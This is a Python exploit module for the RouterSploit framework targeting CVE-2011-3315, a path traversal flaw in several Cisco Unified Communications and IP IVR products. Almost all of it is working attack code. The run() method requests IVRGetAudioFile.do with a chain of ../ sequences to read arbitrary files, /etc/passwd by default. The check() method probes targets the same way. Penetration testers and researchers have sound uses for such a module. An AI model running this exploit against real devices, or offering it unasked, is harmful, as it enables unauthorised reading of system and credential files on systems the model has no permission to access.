from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Path Traversal vulnerability in Cisco Unified Communications Manager,
    Cisco Unified Contact Center Express and Cisco Unified IP Interactive Voice Response devices.
    If the target is vulnerable it allows to read files from the filesystem.
    """
    __info__ = {
        'name': 'Cisco Unified Multi Path Traversal',
        'description': 'Module exploits path traversal vulnerability in Cisco Unified Communications Manager, '
                       'Cisco Unified Contact Center Express and Cisco Unified IP Interactive Voice Response devices.'
                       'If the target is vulnerable it allows to read files from the filesystem.',
        'authors': [
            'Facundo M. de la Cruz (tty0) <fmdlc[at]code4life.com.ar>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/36256/',
            'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3315',
        ],
        'devices': [
            'Cisco Unified Communications Manager 5.x',
            'Cisco Unified Communications Manager 6.x < 6.1(5)',
            'Cisco Unified Communications Manager 7.x < 7.1(5b)',
            'Cisco Unified Communications Manager 8.x < 8.0(3)',
            'Cisco Unified Contact Center Express',
            'Cisco Unified IP Interactive Voice Response < 6.0(1)',
            'Cisco Unified IP Interactive Voice Response 7.0(x) < 7.0(2)',
            'Cisco Unified IP Interactive Voice Response 8.0(x) < 8.5(1)',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')
    filename = exploits.Option('/etc/passwd', 'File to read from the filesystem')

    def run(self):
        if self.check():
            url = "{}:{}/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../..{}".format(self.target, self.port, self.filename)

            response = http_request(method="GET", url=url)
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_success("Exploit success - reading file {}".format(self.filename))
                print_info(response.text)
            else:
                print_error("Exploit failed - could not read file")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "admin:" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
